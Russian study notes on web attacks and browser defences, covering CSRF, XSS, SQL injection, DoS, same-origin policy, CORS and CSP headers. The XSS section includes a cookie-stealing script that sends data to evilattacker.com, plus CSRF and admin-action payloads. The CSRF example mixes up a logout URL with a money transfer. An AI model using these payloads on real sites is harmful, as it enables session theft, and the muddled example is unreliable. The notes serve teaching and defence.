# Attack

## CSRF

CSRF (англ. Сross Site Request Forgery — «Межсайтовая подделка запроса», также XSRF) — атака на посетителей веб-сайтов, использующий недостатки протокола HTTP. Если жертва заходит на сайт, созданный злоумышленником, от её лица тайно отправляется запрос на другой сервер (например, на сервер платёжной системы), осуществляющий некую вредоносную операцию (например, перевод денег на счёт злоумышленника). Для осуществления данной атаки жертва должна быть аутентифицирована на том сервере, на который отправляется запрос, и этот запрос не должен требовать какого-либо подтверждения со стороны пользователя, которое не может быть проигнорировано или подделано атакующим скриптом.

Применение CSRF — вынуждение выполнения каких-либо действий на уязвимом сайте от лица жертвы (изменение пароля, секретного вопроса для восстановления пароля, почты, добавление администратора и т. д.). Также с помощью CSRF возможна эксплуатация отраженных XSS.

Атака осуществляется путём размещения на веб-странице ссылки или скрипта, пытающегося получить доступ к сайту, на котором атакуемый пользователь заведомо (или предположительно) уже аутентифицирован.

Например, сайт an.example.com имеет URL /purse/transfer?to=anotherUser&amout=2000 , который, используя простой GET, переводит деньги на счет другого пользователя. Пока это запрос выполняется самим пользователем – всё в порядке, но в один прекрасный день злоумышленники размещают код 

<img src="http://an.example.com/logout">

на форуме с большой посещаемостью. Браузер не делает никаких отличий между запросом изображения и запросом страницы, так что когда пользователь откроет страницу с таким тегом img , браузер отправит GET запрос на указанный адрес, и деньги будут переведены другому пользователю.

Наиболее простым для понимания способом защиты от данного типа атак является механизм, когда веб-сайты должны требовать подтверждения большинства действий пользователя и проверять поле HTTP_REFERER

Другим распространённым способом защиты является механизм, при котором с каждой сессией пользователя ассоциируется дополнительный секретный уникальный ключ, предназначенный для выполнения запросов. Секретный ключ не должен передаваться в открытом виде, например если это POST запрос, то ключ следует передавать в теле запроса, а не в адресе страницы. Пользователь посылает этот ключ среди параметров каждого запроса, и перед выполнением каких-либо действий сервер проверяет этот ключ. Преимуществом данного механизма, по сравнению с проверкой Referer, является гарантированная защита от атак данного типа

Существует более жёсткий вариант предыдущего механизма, в котором с каждым действием ассоциируется уникальный одноразовый ключ.

## XSS

XSS (англ. Cross-Site Scripting — «межсайтовый скриптинг») — тип атаки на веб-систему, заключающийся во внедрении в выдаваемую веб-сайтом страницу вредоносного Javascript-кода. Этот код выполняется в контексте атакуемого домена и имеет полный контроль над страницей. Ведь с точки зрения браузера сценарий был получен от веб-сервера источника страницы, который автоматически считается надёжным источником.

На странице или в HTTP-Cookie могут быть весьма уязвимые данные (например, идентификатор сессии администратора или номера платёжных документов). И эти данные могут скриптом отправляться на веб-сервер злоумышленника.

Контексты HTML

Браузеры распознают ряд ключевых контекстов, таких как HTML-код, атрибуты HTML, JavaScript, URL, CSS. При XSS-атаке злоумышленник старается прыгнуть из текущего контекста в другой, где можно исполнить JavaScript. В примере ниже XSS-атака может быть произведена на атрибут тега HTML:

<div style="background:<?php echo $color ?>;">

Для того чтобы исключить атаку в данном контексте нужно обязательно экранировать кавычки и символы тегов. Каждый контекст требует другого метода экранирования, потому что у каждого контекста свои специальные символы и разная необходимость в экранировании. Поэтому необходимо внимательно изучать символы, преобразуемые функциями htmlspecialchars() и htmlentities().

Особой проверки требует контекст URL. Так как URL-адрес может начинаться с опасных конструкций вроде javascript: или data:. 

Различают два типа XSS: «отраженные» («reflected XSS» или «Type 1») и «хранимые» («stored XSS» или «Type 2»).

Отражённые XSS

Является самой распространенной XSS-атакой. Отраженную атаку можно провести, если данные, предоставленные пользователем (в параметрах HTTP-запроса или в форме HTML) без надлежащей обработки встраиваются в HTML-страницу. Т. е. «отражаются» от сервера к браузеру в одном и том же запросе

 Отражённая XSS-атака срабатывает, когда пользователь переходит по специально подготовленной ссылке.

http://example.com/search.php?q=<script>DoSomething();</script> 

Если сайт не экранирует угловые скобки при выводе текста запроса, преобразуя их в «&lt;» и «&gt;», скрипт будет встроен в HTML страницу.  Отражённые атаки, как правило, рассылаются по электронной почте или ссылки на них размещаются на других сайтах. URL приманки не вызывают подозрения, указывая на надёжный сайт, но при этом содержат XSS-инъекцию. Переход по ссылке приводит к тому, что браузер жертвы начнет выполнять встроенный скрипт.

Хранимые XSS

Имеют более значительные последствия. Для хранимой XSS, вредоносный код удается сохранить где-то так, что он извлекается и помещается в HTML при просмотре страницы любым пользователем. Чаще всего код внедряется в комментарии, сообщения, сохраняемые в базе данных форума, соц. сети и т.д. Но также хранимая XSS может быть встроена в кеши и логи

Пример хранимой XSS: 

Форум не осуществляет экранирование тегов в комментарии пользователя. Злоумышленник вписывает в комментарий следующий скрипт:

<script>      document.write('<iframe src="http://evilattacker.com?cookie=' + document.cookie.escape() + '" height=0 width=0 />');  </script>

 

В страницу внедряется iframe нулевого размера, которые отправляет куки пользователя на сервер злоумышленника. Куки администратора можно использовать для получения административного доступа.

Если доступ к нужным кукам закрыт флагом HttpOnly, то можно попробовать выполнить из сессии администратора деструктивные действия. Например, удалить, что-то на форуме.

<script>      document.write('<iframe src="http://forum.com/admin.php?action=delete&id=123" height=0 width=0 />');  </script>

 

Способы защиты

·  Контроль типов и содержимого входных данных. Например, проверка на соответствие формату целого числа, формату email, формату URL. (подробнее Контроль входных данных)

·  Экранирование опасных символов (htmlspecialchars() и htmlentities()) и удаление опасных конструкций (strip_tags()). При этом необходимо учитывать контекст.

·  Современная технология «Политика защита контента» (CSP). Подробнее Политика защиты контента (CSP)

·  Все куки с конфиденциальными данными помечать флагом HttpOnly, который запрещает JavaScript доступ к данным этих файлов.

## SQL

Cтроятся путем присоединения к исходному запросу дополнительного. Взломщик должен обладать знаниями о структуре базы данных. Нельзя доверять никаким данным – полям в форме, кукам. При инъекции могут использоваться для доступа к нужным таблицам: комментарии SQL, конструкция UNION.

Избежание:

·   использование подготовленных выражений;

·   проверка введенных данных на соответствие типу и с помощью регулярок;

·   использование функций экранирования;

·   отключить вывод отладочных сообщений в продакшен режиме (в том числе установив display_errors в php.ini, при этом задав log_errors и error_log);

·   логирование всех критических изменений.

## Отсутствие проверки прав

Например:

·  в Controller::Action() не проверяются привелегии пользователя

·  при загрузке статики (image/video) не проверяется наличие уже существующего объекта. В итоге непривилегированный пользователь может переписать объект привилегированного пользователя.

## DoS-атака

DoS (*Denial of Service*, отказ в обслуживании) 

Если обработка какой-либо страницы очень тяжелая (например, поиск), то злоумышленник может организовать DDOS атаку на этот адрес и привести к перегрузке базы данных. 

Также DDOS атака может быть организована случайно ботом, который массово сканирует тяжелые страницы.

Допустимые варианты решения проблемы: 

- отрубить атакуемый функционал (метод API)

- заблокировать атакующие IP

- настроить лимиты на URI. Добавить к функционалу капчу.

- установить лимиты по количеству коннектов. Минус – у других клиентов возникнут проблемы c загрузкой статики в несколько соединений.

- настроить netfilter

<u>Пример:</u>

У нас бот яндекса сканирует страницы в ленте комментариев с большим смещением. Это приводит к большому количеству запросов вида:

```mysql
SELECT * 
FROM comment c 
WHERE ...
ORDER BY ... 
LIMIT 50 OFFSET 25931900
```

Способ диагностики проблемы:

- посмотреть в `SHOW PROCESSLIST` на выполняемые запросы и время их выполнения

- посмотреть в лог *nginx* (*apache*), кто обращается по адресам с тяжелыми страницами

Способ решения проблемы:

- отрубить возможность обращаться к страницам с такими тяжелыми запросами для данного IP или для всех

- перезагрузить *nginx* (*apache*), чтобы сбросить соединения к базе данных, либо вручную сделать `KILL` тяжелым запросам.

# Mechanism

## Правило ограничения домена (Same Origin Policy)

Политика разрешает сценариям, находящимся на страницах одного сайта, доступ к методам и свойствам друг друга без ограничений, но предотвращает доступ к большинству методов и свойств для страниц на разных сайтах. Одинаковые источники — это источники, у которых совпадают три признака: домен, порт, протокол (должны в точности совпадать).

Если без ограничений было бы можно делать HTTP-запросы куда угодно, то хакерский сайт http://hacker.com мог автоматически запустит JS-скрипт, который сделает HTTP-запрос на почтовый сервер http://gmail.com с куками посетителя и получит информацию из почтового ящика посетителя, в банк и т.д. 

## Cross-origin resource sharing (CORS)

CORS («соввместное использование ресурсов между разными источниками») — технология, которая позволяет предоставить веб-странице доступ к ресурсам другого домена. Один из вариантов преодоления ограничения same-origin-policy – JSONP. Однако JSONP имеет ряд недостатков. 

**Простой вариант взаимодействия**, допускает методы: HEAD, GET, POST; заголовки: Accept, Accept-Language, Content-Language, Last-Event-ID, Content-Type (но только со значениями application/x-www-form-urlencoded, multipart/form-data, text/plain).

Браузер добавляет заголовок Origin. Например, страница http://www.a.com/page.html пытается получить данные со страницы http://www.b.com/cors.txt:

GET /cors.txt HTTP/1.1

Host: www.b.com

Origin: www.a.com

Если сервер www.b.com хочет разрешить получение данных с www.a.com то в ответе сервера будет присутствовать строчка:

Access-Control-Allow-Origin: http://www.a.com

Если в ответе сервера отсутствует данная строка, то будет выдана ошибка. Если сервер хочет разрешить доступ любому домену к ресурсу

Access-Control-Allow-Origin: *

Однако такая настройка создает угрозу безопасности, если пользователь авторизован на goodsite.com: badsite.ru может выполнить любой разрешенный аутентифицированный запрос к goodsite.ru, даже не имея прямого доступа к сессионной cookie. Так как в этом случае вместе с запросом отправляются авторизационные cookie.

По умолчанию браузер не передаёт с запросом куки и авторизующие заголовки. Однако в xhr запросе JS скрипт может указать необходимость их передачи через

xhr.withCredentials = true

тогда сервер должен дополнительно включить еще один заголовок:

Access-Control-Allow-Credentials: true

Использование Access-Control-Allow-Origin: * в этом случае запрещено

**Если запрос не удовлетворяет условиям простого**, то он становится **сложным**. Сложные запросы проходят в два этапа. Сначала браузер делает запрос по тому же урлу, но методом OPTIONS, указывая в запросе разрешение на метод и нужные заголовки через заголовки вида Accept-Control-Request^

OPTIONS /cors HTTP/1.1

Origin: [http://api.bob.com](http://api.bob.com/)

Access-Control-Request-Method: PUT

Access-Control-Request-Headers: X-Custom-Header

Host: [api.alice.com](http://api.alice.com/)

Сервер должен ответить с помощью заголовков Access-Control-Allow: какими методами и дополнительными заголовками (помимо стандартных) можно обращаться к нему

200 OK HTTP/1.1

Access-Control-Allow-Origin: [http://api.bob.com](http://api.bob.com/)

Access-Control-Allow-Methods: GET, POST, PUT

Access-Control-Allow-Headers: X-Custom-Header

Access-Control-Max-Age: 3600 //время жизни результата предзапроса

И только получив разрешение, браузер сделает запрос на основной урл.

**Для протокола** **Flash** **player** принцип CORS реализуется через файл crossdomain.xml, который описывает политики, разрешающие загрузку данных между доменами (плеер и данные размещены на разных доменах). Этот файл размещается в корне сайта, откуда загружаются данные (не плеер, а данные) http://site.com/crossdomain.xml. Для Flash разрешение требуется на загрузку стилей, плейлистов (JSON, XML, субтитры и т.д).

## JSONP

Недостатки: 

·  позволяет только получение данных GET-методом.

·  изначально не предусмотренный вариант использования скриптов. 

·  невозможно провести мониторинг результатов работы и поставить callback

·  возможность инъекции 

## Политика защиты контента (CSP)

Политика защиты контента (Content Security Policy, CSP) — механизм для предотвращения XSS и других атак, связанных с выполнением вредоносного контента в контексте доверенной веб-страницы. Поддерживается всеми современными браузерами. 

Заголовок CSP позволяет указать *белый список* надёжных источников ресурсов, с которых браузеру разрешено загружать данные. Любой источник, не указанный в списке разрешённых, причисляется к ненадёжным и просто игнорируется. Также возможный крайний вариант защиты сайта – можно вообще запретить загрузку данных из любого источника, например запретить загрузку скриптов.

CSP покрывает следующие типы данных: JavaScript , CSS , HTML-фреймы, шрифты, изображения, аудио- и видеофайлы и другие возможности HTML5 .

Чтобы включить CSP, веб-сервер должен вернуть HTTP-следующий заголовок:

Content-Security-Policy: <policy-directive>; <policy-directive>

Веб-сервер может вернуть несколько заголовков CSP, каждый из которых будет обрабатываться отдельно браузером. Если одна и та же директивы указана несколько раз, то выбирается самая строгая политика.

Примеры директив извлечения

Директивы извлечения (fetch) указывают, откуда можно загружать разные типы ресурсов. 

·  connect-src – ограничивает источники, к которым можно подключиться с помощью xmlhttprequest, веб-сокетов и т. д.

·  font-src – ограничивает источники для загружаемых шрифтов [`@font-face`](https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face).

·  frame-src – ограничивает источники для [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/frame)и [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe).

·  img-src – ограничивает источники для изображений.

·  media-src` – ограничивает` источники тегов [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/audio), [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/video)и [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/track).

·  object-src` – ограничивает источники `[``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/object), [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed)и [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet).

·  script-src` – ограничивает источники `JavaScript.

·  style-src` – ограничивает` источники CSS.

·  default-src – добавляет в белый список источники сразу для всех вышеперечисленных категорий

Формат директивы политики (policy-directive)

Директива политики состоит из названия директивы (например, script-src), после которой идёт список разделённых пробелами источников, применяемый в качестве белого списка.

<policy-directive> = directive origin origin ...

Возможные варианты источников:

·  URL-адрес. Допускаются все поддомены и пути внутри указанного URL. Вместо всего адреса или части адреса можно использовать «звездочку»: например, * или *://test.ru:*

·  'self' – текущий origin, включая его поддомены

·  ‘none’ – запрещает загрузку ресурсов указанного типа.

·  ‘unsafe-inline’ – разрешает использование «инлайн» JS-скриптов, то есть кода в теге <script> прямо на странице, и «инлайн» тега <style> и атрибута style в теге

·  ‘unsafe-eval’ — разрешает выполнение JavaScript-кода как строки с помощью функций eval, setTimeout и setInterval.

По умолчанию небезопасные (unsafe-X) возможности будут отключены.

Примеры заголовка Content-Security-Policy

Content-Security-Policy: default-src 'self'

В качестве источника всего контента должен выступать origin.

 

Content-Security-Policy: default-src 'self'; script-src http://cdn.test.ru http://ajax.googleapis.com; img-src http://cdn.test.ru; style-src http://cdn.test.ru

CSP разрешает выполнение скриптов только с хостов cdn.test.ru и ajax.googleapis.com, загрузку изображений и стилей — с cdn.test.ru, для остальных типов ресурсов разрешен в качестве источника self (текущий origin), т.е. например для отправки AJAX-запросов (connect-src).

 

Content-Security-Policy: default-src https: 'unsafe-eval' 'unsafe-inline';

Все ресурсы должны загружаться только через HTTPS, разрешены небезопасные возможности

 

Content-Security-Policy: default-src 'none'; script-src 'self' http://code.jquery.com; style-src 'self'

Запретит загрузку любых типов ресурсов, за исключением: Javascript с origin и code.jquery.com, CSS c origin. 